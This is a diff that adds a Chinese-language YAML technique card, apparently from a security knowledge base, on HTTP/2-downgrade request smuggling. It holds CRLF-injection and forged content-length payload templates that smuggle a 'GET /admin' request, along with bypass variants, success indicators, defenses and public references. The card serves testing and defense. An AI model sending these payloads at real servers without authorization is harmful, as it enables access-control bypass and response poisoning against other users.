@@ -1,0 +1,74 @@
+# 技术卡片: HTTP 请求走私 - HTTP/2 降级
+# 分类: request-smuggling / h2-downgrade
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-RS-004 / PortSwigger
+
+id: "rs-h2-downgrade"
+name: "HTTP 请求走私 - HTTP/2 降级攻击"
+category: "request-smuggling"
+subcategory: "h2-downgrade"
+severity: "high"
+
+description: |
+  前端接受 HTTP/2 但将请求降级为 HTTP/1.1 转发给后端。
+  降级时用户注入的 header 值中的 CRLF 未转义，
+  或 content-length 头未剥离，导致请求拆分或走私。
+
+trigger_signals:
+  - "前端支持 HTTP/2"
+  - "后端仅支持 HTTP/1.1"
+  - "降级层未转义 header 中的 CRLF"
+  - "降级层信任用户提供的 content-length 头"
+
+payloads:
+  h2_header_injection:
+    - technique: "在 H2 header 中注入 CRLF"
+      request: |
+        :method POST
+        :path /
+        :authority target.com
+        foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
+    - note: "降级时 header 值中的 CRLF 未转义 → 请求拆分为两个"
+
+  h2_cl_injection:
+    - technique: "H2.CL — 注入虚假 Content-Length"
+      request: |
+        :method POST
+        :path /
+        :authority target.com
+        content-length: 0
+        (DATA frame: GET /admin HTTP/1.1\r\nHost: target.com\r\n...)
+    - note: "降级层信任用户 CL=0，但 DATA 帧内容成为下一个请求"
+
+  h2_pseudo_header:
+    - technique: ":path 或 :authority 中注入 CRLF"
+      path: "/?x=\r\nGET /admin HTTP/1.1\r\nHost: x\r\n\r\n"
+    - note: "降级时将 :path 直接写入 H1.1 请求行"
+
+bypasses:
+  - "大小写变体: Content-length, CONTENT-LENGTH"
+  - "注入多个 content-length 头"
+  - "结合 TE 头注入: transfer-encoding: chunked"
+
+success_indicators:
+  - "第二个伪造请求被后端执行"
+  - "响应队列投毒"
+  - "请求拆分导致 404/400 差异"
+
+prerequisites:
+  - "前端 H2 → 后端 H1.1 降级架构"
+  - "降级层未做 header CRLF 转义"
+  - "降级层信任用户提供的 CL 头"
+
+defense:
+  - "端到端 HTTP/2（后端也支持 H2）"
+  - "降级时强制 strip/转义所有 header CRLF"
+  - "降级层从 DATA 帧重新计算 Content-Length"
+  - "禁用 H2→H1.1 降级或在降级层做严格校验"
+
+sources:
+  - kb: "KB-RS-004 / KB-RS-005"
+  - ref: "James Kettle: HTTP/2 The Sequel is Always Worse (Black Hat 2021)"
+  - ref: "PortSwigger: HTTP/2 downgrade smuggling"
+  - ref: "CWE-444"
